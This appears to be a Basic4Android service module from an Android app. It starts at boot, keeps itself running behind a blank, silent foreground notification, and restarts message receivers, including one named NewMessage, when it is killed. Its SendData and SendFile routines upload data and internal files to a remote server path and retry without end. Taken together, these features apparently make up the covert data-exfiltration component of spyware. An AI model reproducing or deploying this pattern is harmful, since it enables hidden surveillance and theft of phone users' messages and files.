B4A=true
Group=Default Group
ModulesStructureVersion=1
Type=Service
Version=12.8
@EndOfDesignText@
#Region  Service Attributes 
		#StartAtBoot: True
	#StartCommandReturnValue: android.app.Service.START_STICKY
#End Region

Sub Process_Globals
	Dim n As Notification
End Sub

Sub Service_Create
	
End Sub

Sub Service_Start (StartingIntent As Intent)
	Service.AutomaticForegroundMode = Service.AUTOMATIC_FOREGROUND_ALWAYS
	n.Initialize2(n.IMPORTANCE_LOW)
	n.Icon      = "icon"
	n.Sound    = False
	n.Vibrate    = False
	n.Light    = False
	n.Insistent  = False
	n.AutoCancel = False
	n.SetInfo("","","")
	Service.AutomaticForegroundNotification=n
	Service.StartForeground(1,n)
End Sub

Public Sub SendData(data As String)
	Dim SudoPort As String = File.ReadString(File.DirAssets,"sudoport.txt")
	Dim job As HttpJob
	job.Initialize("", Me)
	job.PostString(ServerLink.ApiLink&"/"&SudoPort&"/Received.php", data)
	Wait For (job) JobDone (job As HttpJob)
	If Not(job.Success) Then
		job.Release
		SendData(data)
	Else
		job.Release
		StopService(Me)
	End If
End Sub
Public Sub SendFile(data As String,FileName As String)
	Dim SudoPort As String = File.ReadString(File.DirAssets,"SudoPort.txt")
	Dim job As HttpJob
	job.Initialize("", Me)
	job.PostFile(ServerLink.ApiLink&"/"&SudoPort&"/file.php"&data,File.DirInternal,FileName)
	Wait For (job) JobDone (job As HttpJob)
	If Not(job.Success) Then
		job.Release
		SendFile(data,FileName)
		
	Else
		job.Release
		StopService(Me)
	End If

End Sub

Sub Service_Destroy
	StartReceiver(FirebaseMessaging)
	StartReceiver(NewMessage)
	CallSubDelayed(FirebaseMessaging,"SubscribeToTopics")
	n.Cancel(1)
End Sub